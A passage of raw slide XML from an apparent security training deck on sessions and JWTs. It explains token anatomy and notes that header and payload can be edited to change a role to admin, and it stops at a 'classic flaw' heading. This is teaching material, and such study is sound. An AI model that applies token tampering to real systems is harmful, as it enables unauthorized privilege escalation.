          <p:cNvPr id="578" name="Google Shape;578;p38"/>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Auth, sessions &amp; JWT</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="579" name="Google Shape;579;p38"/>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Who does the server think you are? Sometimes you get to decide.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="580" name="Google Shape;580;p38"/>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p38"/>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582" name="Google Shape;582;p38"/>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7" name="Shape 587"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="588" name="Google Shape;588;p39"/>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SESSIONS 101</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="589" name="Google Shape;589;p39"/>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How the server remembers you</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="590" name="Google Shape;590;p39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1965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91" name="Google Shape;591;p39"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="2122871"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="592" name="Google Shape;592;p39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="1920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You log in once</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="593" name="Google Shape;593;p39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="2286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The server hands back a token (a cookie or a JWT) that says 'this is user X'.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="594" name="Google Shape;594;p39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3108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95" name="Google Shape;595;p39"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="3265871"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="596" name="Google Shape;596;p39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="3063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You send it every request</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="597" name="Google Shape;597;p39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="3429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The token rides along so you do not re-login on each click.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="598" name="Google Shape;598;p39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4251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99" name="Google Shape;599;p39"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="4408871"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="600" name="Google Shape;600;p39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="4206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The server must verify it</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="601" name="Google Shape;601;p39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="4572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If it trusts the token without really checking it - that is the bug.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="602" name="Google Shape;602;p39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6766560" y="2194560"/>
            <a:ext cx="4800600" cy="3108960"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 235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3" name="Google Shape;603;p39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7022592" y="243230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4" name="Google Shape;604;p39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7260336" y="243230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5" name="Google Shape;605;p39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7498080" y="243230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6" name="Google Shape;606;p39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7863840" y="2267712"/>
            <a:ext cx="3520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a request with a token</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="607" name="Google Shape;607;p39"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6766560" y="2724912"/>
            <a:ext cx="4800600" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="12700">
            <a:solidFill>
              <a:srgbClr val="30363D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="sm" w="sm" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="608" name="Google Shape;608;p39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7040880" y="2852928"/>
            <a:ext cx="4251960" cy="2286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GET /admin HTTP/1.1</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Host: target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Authorization: Bearer</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eyJhbGciOiJIUzI1...</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server: 'who is this?'</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answer lives in the token</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="609" name="Google Shape;609;p39"/>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39"/>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611" name="Google Shape;611;p39"/>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6" name="Shape 616"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="617" name="Google Shape;617;p40"/>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ANATOMY</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="618" name="Google Shape;618;p40"/>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A JWT is three base64url chunks</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="619" name="Google Shape;619;p40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2194560"/>
            <a:ext cx="3383280" cy="2377440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 307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0" name="Google Shape;620;p40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="242316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300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="58A6FF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>HEADER</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="621" name="Google Shape;621;p40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="2926080"/>
            <a:ext cx="2834640" cy="1005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6EDF3"/>
              </a:buClr>
              <a:buSzPts val="1150"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1150" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>{"alg":"HS256",  "typ":"JWT"}</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1150" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="622" name="Google Shape;622;p40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="406908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Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="1" lang="en-US" sz="1100" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B949E"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>how it's signed</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="623" name="Google Shape;623;p40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3986784" y="2834640"/>
            <a:ext cx="29260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84F58"/>
              </a:buClr>
              <a:buSzPts val="3600"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="3600" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="484F58"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="624" name="Google Shape;624;p40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4251960" y="2194560"/>
            <a:ext cx="3383280" cy="2377440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 307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5" name="Google Shape;625;p40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4526280" y="242316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PAYLOAD</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="626" name="Google Shape;626;p40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4526280" y="2926080"/>
            <a:ext cx="2834640" cy="1005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6EDF3"/>
              </a:buClr>
              <a:buSzPts val="1150"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1150" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>{"user":"jeff",  "role":"user"}</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1150" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="627" name="Google Shape;627;p40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4526280" y="406908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Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="1" lang="en-US" sz="1100" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B949E"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>who you are (claims)</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="628" name="Google Shape;628;p40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7598664" y="2834640"/>
            <a:ext cx="292608"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84F58"/>
              </a:buClr>
              <a:buSzPts val="3600"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="3600" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="484F58"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="629" name="Google Shape;629;p40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7863840" y="2194560"/>
            <a:ext cx="3383280" cy="2377440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 307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0" name="Google Shape;630;p40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="242316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78BA"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="F778BA"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>SIGNATURE</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="631" name="Google Shape;631;p40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="2926080"/>
            <a:ext cx="2834640" cy="10058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E6EDF3"/>
              </a:buClr>
              <a:buSzPts val="1150"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1150" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>K7gNU3sd...  (keyed hash)</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1150" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="632" name="Google Shape;632;p40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="4069080"/>
            <a:ext cx="2834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Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="1" lang="en-US" sz="1100" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B949E"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>proves it's untampered</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="633" name="Google Shape;633;p40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4937760"/>
            <a:ext cx="10607040"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A JWT (JSON Web Token)'s header and payload are just base64url - </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="D29922"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>anyone can read and edit them.</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B949E"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>  The signature is the only thing stopping you from rewriting your role to admin.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="634" name="Google Shape;634;p40"/>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p40"/>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636" name="Google Shape;636;p40"/>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39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1" name="Shape 641"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="642" name="Google Shape;642;p41"/>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200"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="D29922"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>THE CLASSIC FLAW</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
